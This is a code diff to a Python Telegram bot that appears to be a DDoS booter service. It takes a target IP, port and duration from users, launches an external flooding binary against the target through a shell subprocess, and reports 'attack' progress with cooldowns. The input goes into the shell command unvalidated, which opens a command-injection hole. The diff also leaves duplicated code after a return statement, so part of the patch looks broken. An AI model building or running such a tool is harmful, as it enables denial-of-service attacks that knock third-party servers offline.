@@ -193,7 +193,6 @@ async def attack_start(update: Update, context: CallbackContext):
     await update.message.reply_text("⚠️ *Enter the attack arguments: <ip> <port> <duration>*", parse_mode='Markdown')
     return GET_ATTACK_ARGS
 
-# Attack Command - Handle Attack Input
 async def attack_input(update: Update, context: CallbackContext):
     global last_attack_time, running_attacks, global_cooldown
 
@@ -212,6 +211,147 @@ async def attack_input(update: Update, context: CallbackContext):
     if duration > max_duration:
         await update.message.reply_text(f"❌ *Attack duration exceeds the max limit ({max_duration} sec)!*", parse_mode='Markdown')
         return ConversationHandler.END
+
+    # Calculate dynamic cooldown
+    global_cooldown = calculate_cooldown(duration)
+    last_attack_time = time.time()
+    
+    attack_id = f"{ip}:{port}-{time.time()}"
+    user_id = update.effective_user.id
+    user_name = update.effective_user.full_name
+    
+    running_attacks[attack_id] = {
+        'user_id': user_id,
+        'user_name': user_name,
+        'start_time': time.time(),
+        'duration': duration,
+        'target': f"{ip}:{port}",
+        'message_id': None,
+        'chat_id': update.effective_chat.id
+    }
+
+    # Send initial attack message
+    message = await update.message.reply_text(
+        f"⚔️ *Attack Started!*\n"
+        f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
+        f"🎯 *Target*: `{ip}:{port}`\n"
+        f"🕒 *Duration*: {duration} sec\n"
+        f"⏳ *Time Left*: {duration} sec\n"
+        f"⏲️ *Cooldown Left*: {global_cooldown} sec\n"
+        f"🔥 *Let the battlefield ignite! 💥*",
+        parse_mode='Markdown'
+    )
+    
+    running_attacks[attack_id]['message_id'] = message.message_id
+
+    async def run_attack():
+        start_time = time.time()
+        end_time = start_time + duration
+        cooldown_end = end_time + global_cooldown
+        
+        try:
+            process = await asyncio.create_subprocess_shell(
+                f"./Rahul {ip} {port} {duration}",
+                stdout=asyncio.subprocess.PIPE,
+                stderr=asyncio.subprocess.PIPE
+            )
+
+            # Update every second
+            while time.time() < end_time:
+                time_left = max(0, int(end_time - time.time()))
+                elapsed = int(time.time() - start_time)
+                current_cooldown = max(0, int(cooldown_end - time.time()))
+                
+                try:
+                    await context.bot.edit_message_text(
+                        chat_id=update.effective_chat.id,
+                        message_id=message.message_id,
+                        text=(
+                            f"⚔️ *Attack In Progress!*\n"
+                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
+                            f"🎯 *Target*: `{ip}:{port}`\n"
+                            f"🕒 *Duration*: {duration} sec\n"
+                            f"⏳ *Time Left*: {time_left} sec\n"
+                            f"⏱️ *Elapsed*: {elapsed} sec\n"
+                            f"⏲️ *Cooldown Left*: {current_cooldown} sec\n"
+                            f"🔥 *Attack is running...*"
+                        ),
+                        parse_mode='Markdown'
+                    )
+                except Exception as e:
+                    logging.error(f"Error updating attack status: {str(e)}")
+                
+                await asyncio.sleep(1)
+
+            stdout, stderr = await process.communicate()
+
+            if attack_id in running_attacks:
+                del running_attacks[attack_id]
+
+            current_cooldown = max(0, int(cooldown_end - time.time()))
+            
+            if process.returncode == 0:
+                if user_id not in feedback_waiting:
+                    users_pending_feedback.add(user_id)
+                    await context.bot.edit_message_text(
+                        chat_id=update.effective_chat.id,
+                        message_id=message.message_id,
+                        text=(
+                            f"✅ *Attack Finished!*\n"
+                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
+                            f"🎯 *Target*: `{ip}:{port}`\n"
+                            f"🕒 *Duration*: {duration} sec\n"
+                            f"⏲️ *Cooldown Left*: {current_cooldown} sec\n"
+                            f"📢 *Please provide feedback using the Feedback button before launching another attack!*\n"
+                            f"🔥 *The battlefield is now silent.*"
+                        ),
+                        parse_mode='Markdown'
+                    )
+                else:
+                    await context.bot.edit_message_text(
+                        chat_id=update.effective_chat.id,
+                        message_id=message.message_id,
+                        text=(
+                            f"✅ *Attack Finished!*\n"
+                            f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
+                            f"🎯 *Target*: `{ip}:{port}`\n"
+                            f"🕒 *Duration*: {duration} sec\n"
+                            f"⏲️ *Cooldown Left*: {current_cooldown} sec\n"
+                            f"🔥 *The battlefield is now silent.*"
+                        ),
+                        parse_mode='Markdown'
+                    )
+            else:
+                await context.bot.edit_message_text(
+                    chat_id=update.effective_chat.id,
+                    message_id=message.message_id,
+                    text=(
+                        f"❌ *Attack Failed!*\n"
+                        f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
+                        f"🎯 *Target*: `{ip}:{port}`\n"
+                        f"🕒 *Duration*: {duration} sec\n"
+                        f"💥 *Error*: {stderr.decode().strip()}"
+                    ),
+                    parse_mode='Markdown'
+                )
+        except Exception as e:
+            logging.error(f"Error in attack execution: {str(e)}")
+            if attack_id in running_attacks:
+                del running_attacks[attack_id]
+            await context.bot.edit_message_text(
+                chat_id=update.effective_chat.id,
+                message_id=message.message_id,
+                text=(
+                    f"❌ *Attack Error!*\n"
+                    f"👤 *Attacker*: {escape_markdown(user_name, version=2)}\n"
+                    f"🎯 *Target*: `{ip}:{port}`\n"
+                    f"💥 *Error*: {str(e)}"
+                ),
+                parse_mode='Markdown'
+            )
+
+    asyncio.create_task(run_attack())
+    return ConversationHandler.END
 
     # Calculate dynamic cooldown
     global_cooldown = calculate_cooldown(duration)
